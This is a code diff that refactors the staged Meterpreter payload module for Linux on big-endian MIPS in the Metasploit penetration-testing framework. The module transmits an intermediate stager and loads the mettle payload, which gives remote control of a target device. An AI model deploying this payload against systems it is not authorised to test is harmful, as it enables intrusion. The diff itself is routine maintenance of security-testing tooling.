@@ -12,22 +12,25 @@ module MetasploitModule
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Linux Meterpreter',
-      'Description'   => 'Inject the mettle server payload (staged)',
-      'Author'        => [
-        'Adam Cammack <adam_cammack[at]rapid7.com>'
-      ],
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_MIPSBE,
-      'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_mipsbe_Linux))
+    super(
+      update_info(
+        info,
+        'Name'        => 'Linux Meterpreter',
+        'Description' => 'Inject the mettle server payload (staged)',
+        'Author'      => [
+          'Adam Cammack <adam_cammack[at]rapid7.com>'
+        ],
+        'Platform'    => 'linux',
+        'Arch'        => ARCH_MIPSBE,
+        'License'     => MSF_LICENSE,
+        'Session'     => Msf::Sessions::Meterpreter_mipsbe_Linux
+      )
+    )
   end
 
   def elf_ep(payload)
-    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
-    ep = elf.elf_header.e_entry
-    return ep
+    elf = Rex::ElfParsey::Elf.new(Rex::ImageSource::Memory.new(payload))
+    elf.elf_header.e_entry
   end
 
   def handle_intermediate_stage(conn, payload)
@@ -83,40 +86,11 @@ module MetasploitModule
       0
     ].pack('N*')
 
-    print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
-    conn.put(midstager)
-
-    true
+    vprint_status("Transmitting intermediate stager...(#{midstager.length} bytes)")
+    conn.put(midstager) == midstager.length
   end
 
-  def generate_stage(opts={})
-    meterpreter = generate_meterpreter
-    #config = generate_config(opts)
-    #meterpreter + config
-  end
-
-  def generate_meterpreter
+  def generate_stage(_opts = {})
     MetasploitPayloads::Mettle.read('mips-linux-muslsf', 'mettle.bin')
-  end
-
-  def generate_config(opts={})
-    opts[:uuid] ||= generate_payload_uuid
-
-    # create the configuration block, which for staged connections is really simple.
-    config_opts = {
-      :arch       => opts[:uuid].arch,
-      :exitfunk   => nil,
-      :expiration => datastore['SessionExpirationTimeout'].to_i,
-      :uuid       => opts[:uuid],
-      :transports => [transport_config(opts)],
-      :extensions => [],
-      :ascii_str  => true
-    }
-
-    # create the configuration instance based off the parameters
-    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
-
-    # return the binary version of it
-    config.to_b
   end
 end
